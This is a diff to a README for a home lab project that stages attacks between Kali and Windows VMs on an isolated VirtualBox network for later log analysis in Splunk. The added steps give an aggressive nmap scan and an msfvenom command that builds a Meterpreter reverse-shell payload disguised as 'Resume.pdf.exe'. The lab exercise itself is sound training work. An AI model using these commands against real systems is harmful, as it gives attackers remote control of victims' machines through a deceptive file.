@@ -23,6 +23,16 @@ The project aimed to create a simulated network attack environment using Virtual
 
 1. **Network Configuration**:
      * Set both VMs to use an internal network for isolated communication.
-     * Verify the connection using the ping command.
+     * Verify the connection between the virtual machines using the ping command.
+  
+2. **Scanning for Open Ports**:
+   * On Kali, ran 'Nmap -A 192.168.20.10 -Pn'. This command performs an aggressive scan (-A) on the target IP without pinging the host first (-Pn). It detects open ports, services, OS details, and potential vulnerabilities.
+   * After running the command, identified that port 3389 (RDP) is open.
+
+     ![image alt](https://github.com/HemantVarunParas/Cyber-Attacks-and-Log-Analysis-with-VirtualBox-and-Splunk/blob/02ae843a11ce0da73895b2bf4bae0e7cce666d24/Project%20Images/Screenshot%202024-06-28%20131152.png)
+
+3. **Creating Malware**:
+     * Used msfvenom to create a malware payload with command 'msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=192.168.20.11 LPORT=4444 -f exe -o Resume.pdf.exe'
+     * This command generates a Windows executable (-f exe) with a reverse TCP payload that causes the Windows machine to connect back to the attacker's IP on port 4444, and outputs it as 'Resume.pdf.exe'.
 
 
